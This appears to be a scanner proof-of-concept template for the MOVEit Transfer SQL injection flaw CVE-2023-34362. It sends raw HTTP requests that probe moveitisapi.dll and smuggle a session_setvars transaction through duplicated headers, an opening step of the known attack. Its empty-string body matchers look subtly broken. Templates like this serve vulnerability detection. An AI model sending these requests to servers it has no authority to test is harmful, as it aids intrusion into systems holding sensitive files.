id: poc-yaml-moveit-transfer-remote-code-execution
info:
  name: Progress MOVEit Transfer moveitisapi SQL Injection Vulnerability (CVE-2023-34362)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CVE-2023-34362
http:
  - raw:
      - |
        GET /moveitisapi/moveitisapi.dll?action=capa HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "X-Silock-Errorcode"
          - "X-Silock-Quotedfilenames"
        part: header
      - type: word
        words:
          - ""
        part: body
  - raw:
      - |
        POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1
        Host: {{Hostname}}
        Ax-silock-transaction: folder_add_by_path
        X-siLock-Transaction: session_setvars
        X-siLock-SessVar0: "MyUsername: Guest"
        X-siLock-SessVar1: "MyPkgAccessCode: 123"
        X-siLock-SessVar2: "MyGuestEmailAddr: my_guest_email@example.com"
        Cookie: siLockLongTermInstID=0
        Content-Length: 0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "X-Silock-Errorcode"
        part: header
      - type: word
        words:
          - ""
        part: body
